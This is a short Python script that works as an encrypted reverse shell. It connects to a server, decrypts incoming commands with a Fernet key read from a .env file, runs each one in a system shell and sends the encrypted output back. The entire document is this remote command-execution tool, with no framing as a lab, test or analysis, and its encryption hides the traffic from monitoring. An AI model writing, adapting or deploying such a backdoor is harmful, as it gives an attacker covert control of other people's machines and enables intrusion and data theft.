import socket
import subprocess
from cryptography.fernet import Fernet
import os
from dotenv import load_dotenv

load_dotenv()
HOST = '127.0.0.1'    # The server's hostname or IP address
PORT = 8888            # The port used by the server
KEY = os.getenv("ENCRYPTION_KEY").encode() #  Получаем ключ из .env

f = Fernet(KEY)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    while True:
        data = s.recv(1024)
        if not data: break
        command = f.decrypt(data).decode()
        if command == "exit": break # clean exit
        try:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read() + proc.stderr.read()
            encrypted_output = f.encrypt(stdout_value)
            s.sendall(encrypted_output)
        except Exception as e: # send exception info to server
            encrypted_error = f.encrypt(str(e).encode())
            s.sendall(encrypted_error)